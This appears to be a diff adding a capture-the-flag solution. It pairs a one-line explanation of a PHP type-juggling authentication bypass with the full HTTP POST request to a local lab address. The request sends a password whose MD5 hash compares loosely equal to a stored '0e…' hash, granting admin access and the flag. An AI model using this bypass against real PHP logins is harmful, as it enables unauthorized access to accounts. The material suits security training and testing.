@@ -1,0 +1,8 @@
+# PHP type juggling: md5('240610708')=0e462... equals stored hash 0e678... under loose == comparison. Grants admin access and reveals CTF flag.
+
+POST /index.php HTTP/1.1
+Host: 172.17.0.1:38895
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+
+password=240610708
